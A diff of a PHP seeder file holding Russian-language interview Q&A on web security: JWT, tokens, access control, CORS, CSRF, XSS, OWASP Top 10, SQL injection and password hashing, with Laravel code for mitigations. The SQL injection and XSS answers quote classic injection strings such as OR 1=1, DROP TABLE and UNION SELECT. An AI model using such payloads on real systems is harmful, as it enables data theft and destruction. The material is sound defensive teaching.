@@ -88,9 +88,54 @@ public function update(Request $request, Post $post) {
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое JWT и какие плюсы и минусы?',
-                'answer' => 'JWT (JSON Web Token, RFC 7519) - подписанный токен с тремя частями: header.payload.signature, разделёнными точкой, base64url-кодированы. Внутри payload - claims (sub, iat, exp, roles). Подписан симметричным секретом (HS256) или асимметричным ключом (RS256/ES256). Плюсы: stateless (сервер не хранит сессию), удобен для микросервисов и SPA, любой сервис с public key может проверить токен. Минусы: 1) нельзя отозвать до exp без серверного blacklist (теряем stateless), поэтому короткий exp 5-15 мин + refresh token, 2) размер больше cookie session_id, 3) payload не зашифрован, только подписан - не клади туда чувствительное (для шифрования есть JWE), 4) атаки alg=none и confusion RS256↔HS256 (с public key как secret) до сих пор регулярно ловят в JWT-библиотеках (CVE 2022-2024) - всегда явный allow-list алгоритмов.',
-                'code_example' => 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MDB9.signature',
-                'code_language' => 'bash',
+                'answer' => '**JWT** (JSON Web Token, `RFC 7519`) — **подписанный токен** из трёх частей через точку: `header.payload.signature`, каждая часть **base64url-кодирована**.
+
+**Структура:**
+
+- **header** — `{"alg":"HS256","typ":"JWT"}` — алгоритм подписи
+- **payload** — `claims`: `sub` (user id), `iat`, `exp`, `aud`, кастомные роли
+- **signature** — `HMAC` или `RSA`/`ECDSA` от `header.payload` секретом/приватным ключом
+
+**Алгоритмы подписи:**
+
+- **симметричные** — `HS256`/`HS384`/`HS512` (HMAC, один секрет)
+- **асимметричные** — `RS256`/`ES256` (приватный подписывает, публичный проверяет — удобно для микросервисов)
+
+**Плюсы:**
+
+- **stateless** — сервер не хранит сессию, любой инстанс с ключом проверит
+- **межсервисная аутентификация** — Service B верифицирует токен Service A через публичный ключ
+- удобно для **SPA / mobile** клиентов
+
+**Минусы:**
+
+- **нельзя отозвать до `exp`** без серверного blacklist — теряем stateless
+- **размер больше cookie** `session_id` (сотни байт vs ~30)
+- **payload не зашифрован**, только подписан — НЕ клади туда чувствительное (для шифрования — `JWE`)
+- классические атаки: `alg=none`, `RS256→HS256 confusion` (публичный ключ скармливают как HMAC-секрет) — обязателен **явный allow-list алгоритмов**
+
+**Митигация:** короткий `exp` (5–15 мин) + **refresh token** в БД, явный `aud`/`iss`-чек, библиотеки с защитой от `alg=none`.',
+                'code_example' => '<?php
+use Firebase\\JWT\\JWT;
+use Firebase\\JWT\\Key;
+
+// Issue
+$jwt = JWT::encode([
+    "sub" => $user->id,
+    "iat" => time(),
+    "exp" => time() + 900,        // 15 минут
+    "aud" => "api.example.com",
+], $secret, "HS256");
+
+// Verify — ОБЯЗАТЕЛЬНО явный allow-list алгоритмов
+$payload = JWT::decode($jwt, new Key($secret, "HS256"));
+
+// ❌ Уязвимо: позволяет alg=none / алгоритм-confusion
+// JWT::decode($jwt, new Key($secret));  // без явного алгоритма
+
+// Структура: header.payload.signature
+// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJleHAiOjE3MDB9.<base64-signature>',
+                'code_language' => 'php',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
@@ -104,25 +149,165 @@ public function update(Request $request, Post $post) {
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое access token и refresh token?',
-                'answer' => 'Access token - короткоживущий токен (15 мин - 1 час) для доступа к API. Refresh token - долгоживущий (дни/недели) для получения нового access token без логина. Простыми словами: access - пропуск на сегодня, refresh - удостоверение, по которому выдают пропуска. Если access утёк - украли на короткое время. Refresh хранится безопаснее (HttpOnly cookie), может быть отозван. На каждом запросе используется access, при истечении - refresh обновляет его.',
+                'answer' => 'Пара токенов разной длительности жизни — компромисс между **stateless-производительностью** и **возможностью отзыва**.
+
+| | **Access token** | **Refresh token** |
+|---|---|---|
+| **Срок жизни** | 5–15 мин (до 1 ч) | дни / недели / месяцы |
+| **Назначение** | пропуск к API на каждом запросе | обмен на новый `access` без перелогина |
+| **Хранение клиентом** | память приложения / `Authorization: Bearer` | **HttpOnly + Secure + SameSite** cookie |
+| **Где валидируется** | по подписи (`stateless`) | по записи в БД (`stateful`) |
+| **Можно отозвать?** | нет, ждём `exp` | да, удалили из БД |
+
+**Поток (flow):**
+
+1. Клиент логинится → сервер выдаёт **пару**: `access` (15 мин) + `refresh` (30 дней)
+2. Клиент шлёт `access` в `Authorization: Bearer ...` на каждый запрос
+3. Когда API ответил `401` → клиент идёт на `POST /auth/refresh` с `refresh`
+4. Сервер проверяет `refresh` в БД → выдаёт **новую пару**, старый `refresh` помечает использованным (**rotation**)
+5. **Logout** = удаление `refresh` из БД, максимум через 15 мин старый `access` сам умрёт
+
+**Зачем такой огород:**
+
+- `access` короткий → утечка ограничена 15 минутами
+- `refresh` хранится в БД → можно мгновенно **отозвать** (logout, смена пароля, бан)
+- **rotation + reuse detection** — если кто-то использовал тот же `refresh` дважды, инвалидируем всю цепочку (украли)
+
+Это стандарт **OAuth 2.0** и `Laravel Sanctum` / `Passport`.',
+                'code_example' => '<?php
+// POST /auth/login
+return response()->json([
+    "access_token" => JWT::encode([
+        "sub" => $user->id,
+        "exp" => time() + 900,                   // 15 минут
+    ], $secret, "HS256"),
+    "refresh_token" => DB::table("refresh_tokens")->insertGetId([
+        "user_id" => $user->id,
+        "token_hash" => hash("sha256", $raw = bin2hex(random_bytes(32))),
+        "expires_at" => now()->addDays(30),
+    ]) ? $raw : null,
+]);
+
+// POST /auth/refresh (rotation + reuse detection)
+$row = DB::table("refresh_tokens")
+    ->where("token_hash", hash("sha256", $raw))
+    ->first();
+
+if (!$row || $row->revoked_at) {
+    // reuse detected — инвалидируем всю цепочку
+    DB::table("refresh_tokens")->where("user_id", $row?->user_id)->update(["revoked_at" => now()]);
+    abort(401);
+}
+
+// rotate: старый refresh помечаем, выдаём новую пару',
+                'code_language' => 'php',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое RBAC и ABAC?',
-                'answer' => 'RBAC (Role-Based Access Control) - доступ через роли: admin, editor, viewer. У пользователя роль, у роли набор прав. Простой и понятный. ABAC (Attribute-Based Access Control) - доступ через атрибуты: пользователь+ресурс+действие+контекст. Например: "редактировать может автор, или админ, или модератор отдела автора, в рабочее время". Гибче RBAC, но сложнее. В реальности часто комбинируют: RBAC как база + ABAC-правила сверху.',
+                'answer' => 'Две модели **авторизации** (`AuthZ`), решающие «что юзеру можно делать».
+
+**RBAC** (Role-Based Access Control) — доступ **через роли**:
+
+- у пользователя одна или несколько **ролей** (`admin`, `editor`, `viewer`)
+- у каждой роли — **набор permissions** (`posts.create`, `posts.delete`)
+- проверка: «есть ли у юзера роль с нужным permission?»
+- **прост в понимании**, легко рисуется матрицей `роль × ресурс`
+- слабо учитывает **контекст** — нельзя сказать «редактировать может только автор поста»
+
+**ABAC** (Attribute-Based Access Control) — доступ **через атрибуты**:
+
+- решение строится из **атрибутов**: `subject` (юзер: `department=sales`), `resource` (пост: `owner_id=42`), `action` (`edit`), `environment` (`time`, `IP`)
+- правила вида: «`edit` разрешён, если `subject.id == resource.owner_id` ИЛИ `subject.role == admin`»
+- **гибко**, легко выражать ownership, time-based, location-based
+- сложнее аудит — правила могут пересекаться, нужны политики (`OPA`, `Cedar`, `XACML`)
+
+**Сравнение:**
+
+| | **RBAC** | **ABAC** |
+|---|---|---|
+| **Гранулярность** | роль → permissions | per-resource атрибуты |
+| **Контекст** | плохо | отлично |
+| **Сложность** | низкая | высокая |
+| **Когда брать** | стандартные приложения | сложные домены (медицина, банки) |
+
+**На практике** — комбинируют: **RBAC как база** (роль `editor` даёт `posts.edit`) + **ABAC-правила сверху** (ownership: только свой пост).
+
+**В Laravel:** `RBAC` — `spatie/laravel-permission`; `ABAC` — `Gate::define()` / `Policies` с проверкой ownership и контекста.',
+                'code_example' => '<?php
+// RBAC через spatie/laravel-permission
+$user->assignRole("editor");
+$user->givePermissionTo("posts.publish");
+if ($user->hasPermissionTo("posts.publish")) { /* ... */ }
+
+// ABAC через Policy: правило учитывает атрибуты ресурса и контекста
+class PostPolicy
+{
+    public function update(User $user, Post $post): bool
+    {
+        return $user->id === $post->author_id        // ownership
+            || $user->hasRole("admin")               // RBAC fallback
+            || ($user->department === $post->department
+                && now()->isBetween("09:00", "18:00")); // environment
+    }
+}
+
+// Gate::authorize("update", $post) → 403, если правило не прошло',
+                'code_language' => 'php',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое CORS простыми словами?',
-                'answer' => 'CORS (Cross-Origin Resource Sharing) - механизм браузера, контролирующий, может ли cross-origin JavaScript ЧИТАТЬ ответ другого origin. По same-origin policy браузер по умолчанию запрещает сайту example.com через JS читать ответ api.other.com; сервер api.other.com может разрешить через заголовок Access-Control-Allow-Origin. Preflight (OPTIONS) идёт перед "сложными" запросами для проверки разрешений. ВАЖНО: CORS - это НЕ защита от XSS и не от CSRF; это механизм управления чтением cross-origin данных в браузере. От XSS защищают экранирование вывода, CSP, HttpOnly/SameSite cookies; от CSRF - CSRF-токены и SameSite cookies. CORS лишь определяет, что разрешит браузер cross-origin JS прочесть из ответа.',
-                'code_example' => 'Access-Control-Allow-Origin: https://example.com
+                'answer' => '**CORS** (Cross-Origin Resource Sharing) — **механизм браузера**, контролирующий, может ли **cross-origin JS читать ответ** другого `origin`.
+
+**Контекст — Same-Origin Policy (SOP):** браузер по умолчанию **запрещает** сайту `example.com` через `fetch`/`XHR` читать ответ от `api.other.com`. `origin` = `схема + хост + порт`.
+
+`CORS` — это **способ для сервера явно разрешить** определённым origin-ам читать ответ через заголовки.
+
+**Заголовки на сервере:**
+
+- `Access-Control-Allow-Origin: https://example.com` — кому разрешено (или `*` для публичных API без credentials)
+- `Access-Control-Allow-Methods: GET, POST, PUT, DELETE`
+- `Access-Control-Allow-Headers: Content-Type, Authorization`
+- `Access-Control-Allow-Credentials: true` — разрешить отправку cookie (тогда `Allow-Origin` НЕ может быть `*`)
+- `Access-Control-Max-Age: 86400` — кэш preflight ответа в браузере
+
+**Preflight (`OPTIONS`)** — браузер шлёт **перед** «сложным» запросом (методы кроме `GET`/`POST`/`HEAD`, `Authorization`, кастомные заголовки, `Content-Type: application/json`):
+
+```
+OPTIONS /api/users HTTP/1.1
+Origin: https://example.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: Authorization
+```
+
+Сервер отвечает заголовками — браузер пускает или режет.
+
+**ВАЖНО — что CORS НЕ делает:**
+
+- **НЕ защита от XSS** — XSS лечится экранированием, `CSP`, `HttpOnly`
+- **НЕ защита от CSRF** — CSRF лечится токенами + `SameSite`-cookie
+- **НЕ защита сервера** — `curl`/Postman игнорируют CORS, это **только браузер**
+- НЕ запрещает запрос — запрос **уйдёт** на сервер, браузер просто **не отдаст ответ JS-у**
+
+**Типичные ошибки:** `*` + `Allow-Credentials: true` (браузер отбросит), забыли `OPTIONS` в роутах → `405` на preflight.',
+                'code_example' => '# Сервер на preflight (OPTIONS)
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://example.com
 Access-Control-Allow-Methods: GET, POST, PUT, DELETE
 Access-Control-Allow-Headers: Content-Type, Authorization
-Access-Control-Max-Age: 86400',
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 86400
+
+# В Laravel — config/cors.php
+# "paths" => ["api/*"],
+# "allowed_origins" => ["https://example.com"],
+# "allowed_methods" => ["*"],
+# "supports_credentials" => true,',
                 'code_language' => 'bash',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
@@ -130,28 +315,178 @@ Access-Control-Max-Age: 86400',
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое CSRF и как защищаться?',
-                'answer' => 'CSRF (Cross-Site Request Forgery) - атака, когда вредоносный сайт от имени залогиненного пользователя шлёт запрос на твой сайт через его cookies. Простыми словами: ты залогинен в банке, открыл вредоносный сайт - он скрытно шлёт POST /transfer от твоего имени. Защита: CSRF-токен в форме (Laravel @csrf), который вредоносный сайт не может узнать. SameSite cookies (Strict/Lax) тоже помогают.',
+                'answer' => '**CSRF** (Cross-Site Request Forgery) — атака, в которой **вредоносный сайт через браузер жертвы** заставляет её **отправить запрос** на доверенный сайт, используя её **активную сессию** (cookie).
+
+**Сценарий атаки:**
+
+1. Жертва залогинена в `bank.com` — в браузере живёт sessionId-cookie
+2. Жертва открывает `evil.com`, на нём `<form action="https://bank.com/transfer" method="POST">` с автосабмитом
+3. Браузер автоматически **прикладывает cookie** `bank.com` к запросу
+4. `bank.com` видит валидную сессию — выполняет перевод от имени жертвы
+
+**Защиты (нужно несколько слоёв):**
+
+1. **CSRF-токен** (synchronizer token) — сервер генерирует случайный токен на сессию, кладёт в форму **скрытым полем**. На `evil.com` токена нет — запрос отбрасывается. В Laravel — `@csrf` директива + `VerifyCsrfToken` middleware.
+2. **`SameSite` cookie** — флаг `SameSite=Lax` или `Strict` запрещает браузеру слать cookie в кросс-доменных запросах. С `Lax` (по умолчанию в современных браузерах) большая часть CSRF закрыта автоматически.
+3. **`Origin`/`Referer` чек** — сервер проверяет, что запрос пришёл с своего домена.
+4. **Double-submit cookie** — токен в cookie + в заголовке, сервер сравнивает. Подходит для **stateless API**.
+
+**Что НЕ помогает:**
+
+- HTTPS — атакующий уже не подслушивает, а заставляет жертву отправить запрос
+- `HttpOnly` — спасает от XSS-кражи, но cookie всё равно отправляется автоматически
+- CORS — это про чтение ответа, а CSRF про **запись запроса**
+
+**Какие методы безопасны:** `GET` (safe) не должен менять состояние. CSRF обычно бьёт по `POST`/`PUT`/`DELETE`.',
+                'code_example' => '<!-- Blade: Laravel автоматически добавляет токен -->
+<form method="POST" action="/transfer">
+    @csrf
+    <input name="amount" value="1000">
+</form>
+
+<!-- Что получится -->
+<input type="hidden" name="_token" value="aBcD1234...">
+
+<!-- AJAX: токен через meta-тег + заголовок X-CSRF-TOKEN -->
+<meta name="csrf-token" content="{{ csrf_token() }}">
+<script>
+fetch("/api/transfer", {
+    method: "POST",
+    headers: {
+        "X-CSRF-TOKEN": document.querySelector("meta[name=csrf-token]").content,
+        "Content-Type": "application/json",
+    },
+    body: JSON.stringify({amount: 1000}),
+});
+</script>
+
+<!-- config/session.php: SameSite=Lax по умолчанию -->
+<!-- "same_site" => "lax" — закрывает большинство CSRF без токена -->',
+                'code_language' => 'blade',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое XSS и как защищаться?',
-                'answer' => 'XSS (Cross-Site Scripting) - инъекция вредоносного JS в страницу. Простыми словами: пользователь оставил коммент с <script>alert(stolenCookie)</script>, и этот скрипт выполняется у других посетителей. Защита: 1) экранировать вывод (Blade {{ }} автоматом), 2) Content-Security-Policy header, 3) HttpOnly cookies (JS не доступен), 4) sanitize HTML если разрешён (HTMLPurifier). Никогда не вставляй пользовательский ввод в HTML/JS без обработки.',
+                'answer' => '**XSS** (Cross-Site Scripting) — **инъекция чужого JavaScript** в твою страницу, который потом исполняется **в браузере других пользователей** с их правами.
+
+**Типы:**
+
+- **Stored XSS** — скрипт **сохраняется в БД** (комментарий, профиль) и выдаётся всем посетителям. Самый опасный.
+- **Reflected XSS** — скрипт **в URL/параметре**, сервер вернул его в ответ без экранирования. Жертве нужна подготовленная ссылка.
+- **DOM-based XSS** — вообще не доходит до сервера: уязвимый клиентский JS пишет `location.hash` в `innerHTML`.
+
+**Что атакующий получает:**
+
+- кражу **cookie** (через `document.cookie`, если нет `HttpOnly`)
+- действия **от имени жертвы** (через её активную сессию)
+- кейлоггинг, фишинговые формы поверх UI
+
+**Защиты (нужно несколько слоёв):**
+
+1. **Экранирование вывода** — главное. В Laravel `{{ $var }}` (Blade) автоматически делает `htmlspecialchars` с `ENT_QUOTES`. `{!! $var !!}` — **сырой HTML, опасно**.
+2. **`Content-Security-Policy`** — браузер исполнит JS **только из разрешённых источников**. Даже если атакующий внедрил `<script>`, CSP его блокирует.
+3. **`HttpOnly` cookie** — JS не видит `document.cookie`, кража сессии затруднена.
+4. **Санитизация HTML**, если разрешён (комменты с форматированием) — `HTMLPurifier`, `DOMPurify`. Whitelist разрешённых тегов.
+5. **Контекстное экранирование** — для атрибутов, JS, CSS, URL разные правила. Внутри `<script>` — `json_encode` с `JSON_HEX_TAG`.
+
+**Главное правило:** **никогда** не вставляй пользовательский ввод в HTML/JS/CSS/URL **сырым**.',
+                'code_example' => '<!-- Blade: { { } } автоматически экранирует -->
+<div>{{ $comment->text }}</div>
+<!-- "<script>alert(1)</script>" → "&lt;script&gt;alert(1)&lt;/script&gt;" -->
+
+<!-- ❌ Опасно — сырой HTML -->
+<div>{!! $comment->text !!}</div>
+
+<!-- В JS-контексте: json_encode -->
+<script>
+    const user = {!! json_encode($user, JSON_HEX_TAG | JSON_HEX_AMP) !!};
+</script>
+
+<!-- CSP header -->
+Content-Security-Policy:
+    default-src \'self\';
+    script-src \'self\' \'nonce-abc123\';
+    object-src \'none\';
+
+<!-- HttpOnly cookie (config/session.php) -->
+"http_only" => true,',
+                'code_language' => 'blade',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое OWASP Top 10?',
-                'answer' => 'OWASP Top 10 (2021) - топ-10 веб-уязвимостей: A01 Broken Access Control (нарушение прав доступа, IDOR), A02 Cryptographic Failures (слабая криптография, plain text), A03 Injection (SQLi, NoSQLi, командная), A04 Insecure Design, A05 Security Misconfiguration (дефолтные креды, debug в проде), A06 Vulnerable and Outdated Components (старые либы с CVE), A07 Identification and Authentication Failures (слабые пароли, brute-force), A08 Software and Data Integrity Failures (CI/CD, supply chain), A09 Security Logging and Monitoring Failures, A10 Server-Side Request Forgery (SSRF). Это базовый чек-лист для аудита.',
+                'answer' => '**OWASP Top 10** — топ-10 **самых критичных веб-уязвимостей** по версии **Open Web Application Security Project**. Базовый **чек-лист** для аудита и собесов. Версия 2021 (обновляется каждые 3–4 года):
+
+| Код | Категория | Что значит |
+|---|---|---|
+| **A01** | Broken Access Control | Юзер обходит права (IDOR, force browsing, отсутствие проверки ownership) |
+| **A02** | Cryptographic Failures | Plain-text пароли, слабые алгоритмы (`md5`, `RC4`), нет TLS |
+| **A03** | Injection | `SQLi`, `NoSQLi`, command injection, LDAP injection |
+| **A04** | Insecure Design | Архитектурные ошибки — нет threat modeling, нет rate limit на критичных операциях |
+| **A05** | Security Misconfiguration | Дефолтные креды, `debug=true` в проде, открытые `.git`/`.env` |
+| **A06** | Vulnerable Components | Устаревшие либы с CVE (`log4j`, `Spring4Shell`) |
+| **A07** | Auth Failures | Слабые пароли, brute-force, credential stuffing, session fixation |
+| **A08** | Data Integrity Failures | Supply chain (npm/composer-пакеты), unsigned auto-updates, insecure CI/CD |
+| **A09** | Logging/Monitoring Failures | Нет логов входов/ошибок → атаку замечают через месяцы |
+| **A10** | **SSRF** | Сервер по запросу клиента ходит на внутренний адрес (`169.254.169.254`, Redis) |
+
+**Главное смещение 2021 vs 2017:**
+
+- `Broken Access Control` поднялся с A05 на **A01** — №1 по частоте находок
+- Появились **A04 Insecure Design** и **A10 SSRF** — раньше их не было
+
+**Зачем знать:**
+
+- Это **минимум**, который спрашивают на собесах и проверяют пентестеры
+- Для каждой категории есть **OWASP Cheat Sheet** с готовыми митигациями
+- Compliance (PCI-DSS, SOC 2) часто ссылается на этот список',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Что такое SQL injection и как защищаться?',
-                'answer' => 'SQL Injection - подмена логики SQL-запроса через непроверенный пользовательский ввод. Пример: "SELECT * FROM users WHERE name = \'" . $name . "\'", где $name = "\' OR 1=1 --" даёт всех пользователей. Грозит чтением/изменением/удалением данных, эскалацией прав. Защита: 1) prepared statements (параметризованные запросы) - ввод никогда не попадает в SQL-парсер, всегда как value, 2) ORM (Eloquent, Doctrine) делает это по умолчанию, 3) валидация и whitelist для имён колонок/таблиц (их параметризовать нельзя), 4) принцип минимальных прав - у app-юзера нет DROP, 5) WAF как доп. слой. Никогда не делай ручную конкатенацию SQL.',
+                'answer' => '**SQL Injection** — подмена логики SQL-запроса через **непроверенный пользовательский ввод**, который попадает прямо в строку запроса.
+
+**Канонический пример:**
+
+```php
+$query = "SELECT * FROM users WHERE name = \'$name\'";
+```
+
+При `$name = "\' OR 1=1 --"` запрос становится:
+
+```sql
+SELECT * FROM users WHERE name = \'\' OR 1=1 --\'
+```
+
+— вернёт всю таблицу. С `\'; DROP TABLE users; --` — снесёт её.
+
+**Чем грозит:**
+
+- **чтение** всех данных (`UNION SELECT password FROM users`)
+- **изменение/удаление**
+- **эскалация прав** в БД, выполнение команд ОС через `xp_cmdshell` (MSSQL) или функции расширений
+- **обход аутентификации** (`OR 1=1 -- ` в логине)
+
+**Защиты (несколько слоёв):**
+
+1. **Prepared statements (параметризация)** — главное. SQL и данные **разделяются**: значение никогда не парсится как SQL.
+2. **ORM** (`Eloquent`, `Doctrine`) — параметризует по умолчанию. `User::where("email", $email)` — безопасно.
+3. **Whitelist для имён колонок/таблиц** — их **параметризовать нельзя**, только проверять по списку.
+4. **Принцип наименьших привилегий** — у app-юзера БД нет `DROP`/`GRANT`/`CREATE USER`.
+5. **WAF** (`ModSecurity`, Cloudflare) — дополнительный слой против известных паттернов.
+6. **Stored Procedures** — если внутри них тоже параметризация, не динамический SQL.
+
+**Антипаттерны, которые всё ещё ломают:**
+
+- ручной `DB::raw()` со склеиванием строк
+- `orderBy($_GET[\'sort\'])` без whitelist — позволяет `ORDER BY (SELECT ...)`
+- `LIKE \'%\' . $q . \'%\'` без эскейпа `%` и `_`',
                 'code_example' => '<?php
 // плохо - SQL injection
 $users = DB::select("SELECT * FROM users WHERE email = \'$email\'");
@@ -173,7 +508,38 @@ User::orderBy($column)->get();',
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Почему нельзя хешировать пароли через md5 или sha256?',
-                'answer' => 'md5 и sha256 быстрые - именно поэтому плохие для паролей. Современные GPU считают миллиарды sha256/сек, при утечке базы пароли подбираются за минуты. md5 ещё и ломан криптографически (collision attacks). Для паролей нужны медленные функции: bcrypt, argon2, scrypt - они спроектированы быть медленными и потребляющими память. bcrypt: классика с 1999, cost factor (12+), есть лимит в 72 байта. Argon2id (победитель Password Hashing Competition 2015) - современный выбор, защищён от GPU/ASIC, есть параметры memory/time/parallelism. scrypt - между ними, memory-hard. Все они автоматически добавляют salt (защита от rainbow tables). В PHP - password_hash/password_verify (PASSWORD_BCRYPT по умолчанию, рекомендуется PASSWORD_ARGON2ID).',
+                'answer' => '**`md5` и `sha256` спроектированы быть быстрыми** — именно поэтому **непригодны для паролей**.
+
+**Цифры (для понимания):**
+
+- современный GPU (RTX 4090) считает **~100 млрд `sha256`/сек**
+- словарь из 14 млн популярных паролей перебирается **за миллисекунду**
+- весь 8-символьный keyspace (`[a-zA-Z0-9]`) — **за час**
+- `md5` к тому же **криптографически сломан** (collision attacks с 2004 года)
+
+**Что нужно для паролей — медленные, memory-hard функции:**
+
+| Алгоритм | Год | Параметры | Особенности |
+|---|---|---|---|
+| **`bcrypt`** | 1999 | `cost` (12+) | Классика, проверен временем. **Лимит 72 байта** на пароль |
+| **`scrypt`** | 2009 | `N`, `r`, `p` (память/время/параллелизм) | Memory-hard |
+| **`argon2id`** | 2015 | `memory`, `time`, `parallelism` | **Победитель Password Hashing Competition**. Защита от GPU/ASIC. **Современный выбор** |
+
+**Что они делают правильно:**
+
+- **медленные** (50–300 мс на проверку) — атакующий не сможет перебирать миллиарды/сек
+- **memory-hard** (`scrypt`, `argon2id`) — требуют МБ памяти на хеш, GPU/ASIC выигрывают мало
+- **автоматическая соль** — нет двух одинаковых хешей у одного пароля
+- **встроенный параметр сложности** — можно увеличивать `cost` по мере роста железа
+
+**В PHP:**
+
+- `password_hash($pwd, PASSWORD_BCRYPT)` — `bcrypt`, по умолчанию
+- `password_hash($pwd, PASSWORD_ARGON2ID)` — **рекомендуется**
+- `password_verify()` — проверка (хеш сам несёт алгоритм и соль)
+- `password_needs_rehash()` — обновить хеш, если повысили `cost`
+
+**В Laravel:** `Hash::make()` / `Hash::check()`, алгоритм в `config/hashing.php`.',
                 'code_example' => '<?php
 $hash = password_hash("password123", PASSWORD_ARGON2ID);
 if (password_verify($input, $hash)) {
@@ -504,21 +870,120 @@ Hash::check("qwerty123", $hash); // true',
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Чем argon2id отличается от bcrypt и почему его сейчас обычно предпочитают?',
-                'answer' => 'bcrypt тюнится только параметром cost (раундами CPU), а argon2id подкручивает три параметра: время, память и параллелизм. За счёт memory-hard свойства argon2id ломается на GPU и ASIC заметно дороже, чем bcrypt с тем же временем проверки. Плюс у bcrypt есть исторический предел в 72 байта на пароль, у argon2id такого ограничения нет. На практике argon2id выбирают как PASSWORD_ARGON2ID в password_hash(), а bcrypt оставляют там, где argon2 не поддерживается.',
+                'answer' => 'Оба — **медленные password-hash функции**. Главное отличие — **memory-hardness**.
+
+| | **`bcrypt`** (1999) | **`argon2id`** (2015) |
+|---|---|---|
+| **Тюнинг** | один параметр — `cost` (CPU-раунды) | три — `memory`, `time`, `parallelism` |
+| **Memory-hard** | нет (~4 KB) | **да** (десятки–сотни МБ) |
+| **Защита от GPU/ASIC** | средняя | **высокая** — память дорогая на ASIC |
+| **Лимит пароля** | **72 байта** (молча обрезает) | без лимита |
+| **Стандарт** | де-факто | **победитель Password Hashing Competition** |
+| **PHP-константа** | `PASSWORD_BCRYPT` | `PASSWORD_ARGON2ID` |
+
+**Что значит memory-hard:** `argon2id` форсирует **много памяти** на вычисление хеша. Атакующий с GPU на 24 ГБ может крутить тысячи `bcrypt` параллельно, но **сотни `argon2id`** — упирается в RAM. На ASIC ещё дороже — там память самое узкое место.
+
+**Параметры `argon2id` по умолчанию в PHP:**
+
+- `memory_cost = 65536` (64 МБ)
+- `time_cost = 4` (4 итерации)
+- `threads = 1`
+
+Подбирать так, чтобы **проверка занимала ~250–500 мс** на твоём железе — баланс UX и стойкости.
+
+**Когда выбирать что:**
+
+- **новый проект** → `argon2id`
+- **старый проект на `bcrypt`** → нормально, **постепенная миграция** через `password_needs_rehash()` при логине
+- **`bcrypt` остаётся**, если хостинг без `libsodium`/`argon2` (`PHP < 7.2` без extension)',
+                'code_example' => '<?php
+// Argon2id с явными параметрами
+$hash = password_hash($password, PASSWORD_ARGON2ID, [
+    "memory_cost" => 65536,   // 64 МБ
+    "time_cost"   => 4,
+    "threads"     => 1,
+]);
+
+// Прозрачная миграция bcrypt → argon2id при логине
+if (password_verify($password, $user->password)) {
+    if (password_needs_rehash($user->password, PASSWORD_ARGON2ID)) {
+        $user->update(["password" => password_hash($password, PASSWORD_ARGON2ID)]);
+    }
+    Auth::login($user);
+}
+
+// Laravel: config/hashing.php
+// "driver" => "argon2id",
+// "argon" => ["memory" => 65536, "threads" => 1, "time" => 4],',
+                'code_language' => 'php',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Чем отличаются stored, reflected и DOM-based XSS?',
-                'answer' => 'Stored XSS — вредоносный скрипт сохраняется на сервере (в комментарии, профиле) и потом выдаётся всем посетителям страницы. Reflected XSS — скрипт прилетает в URL или форме одного запроса и сразу же выводится в ответ без сохранения, поэтому атака требует, чтобы жертва кликнула по подготовленной ссылке. DOM-based XSS вообще не доходит до сервера: уязвимость целиком в JS на клиенте, который берёт location.hash или document.referrer и пишет его в innerHTML. Поэтому защита разная: первые две лечатся экранированием на сервере, третья — корректной работой с DOM в клиентском коде.',
+                'answer' => 'Три типа `XSS` различаются **тем, где живёт payload** и **как доходит до жертвы**.
+
+| | **Stored** | **Reflected** | **DOM-based** |
+|---|---|---|---|
+| **Где payload** | в БД на сервере | в URL/параметре одного запроса | в клиентском JS, не уходит на сервер |
+| **Доставка жертве** | автоматически всем посетителям страницы | через подготовленную ссылку (фишинг) | через ссылку, но обработка на клиенте |
+| **Опасность** | **максимальная** (массовая) | средняя (нужен клик) | средняя |
+| **Где чинить** | экранирование вывода на сервере | экранирование вывода на сервере | работа с DOM в клиентском JS |
+
+**Stored XSS** — атакующий **сохраняет** скрипт (комментарий, имя профиля, описание товара). Сервер потом отдаёт его всем — payload запускается **у каждого посетителя страницы**. Самый опасный: одна вставка → тысячи жертв.
+
+**Reflected XSS** — payload **в параметре одного запроса**: `https://site.com/search?q=<script>...</script>`. Сервер вернул его в HTML без экранирования. Жертва должна **кликнуть** по подготовленной ссылке. Часто доставляется через фишинг.
+
+**DOM-based XSS** — **полностью в клиенте**. Уязвимый JS читает данные из источника (`location.hash`, `document.referrer`, `window.name`) и пишет в опасный sink (`innerHTML`, `eval`, `document.write`). **Сервер вообще не видит payload** — WAF и серверная защита бесполезны.
+
+**Защита:**
+
+- **Stored/Reflected** — экранирование вывода на сервере (`htmlspecialchars`, Blade `{{ }}`)
+- **DOM-based** — **только клиентская защита**: использовать `textContent` вместо `innerHTML`, `setAttribute()` вместо склейки HTML, `DOMPurify` для разрешённого HTML
+- **CSP** — помогает против всех трёх, особенно `script-src \'self\' \'nonce-...\'`',
                 'difficulty' => 3,
                 'topic' => 'system_design.security',
             ],
             [
                 'category' => 'Архитектура систем',
                 'question' => 'Какие флаги cookie и зачем нужны для защиты сессии?',
